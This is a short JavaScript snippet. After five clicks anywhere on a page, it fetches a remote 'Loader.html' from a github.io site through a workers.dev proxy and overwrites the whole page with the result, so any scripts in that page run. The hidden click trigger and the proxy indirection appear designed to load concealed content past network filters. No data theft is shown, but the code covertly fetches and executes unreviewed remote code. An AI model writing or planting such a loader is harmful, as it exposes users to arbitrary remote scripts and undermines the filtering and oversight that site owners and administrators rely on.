const proxy = "https://fragrant-sound-4143.blitzedzzontoppoihsblitzedzzontoppoihs.workers.dev/?url=";
const target = "https://superhardmath.github.io/mango67mango/Loader.html";
let clicks = 0;
document.addEventListener("click", async () => {
    clicks++;
    if (clicks === 5) {
        try {
            const res = await fetch(proxy + encodeURIComponent(target));
            const html = await res.text();
            document.open();
            document.write(html);
            document.close();
        } catch (err) {
            console.error("Proxy fetch failed:", err);
        }
    }
});
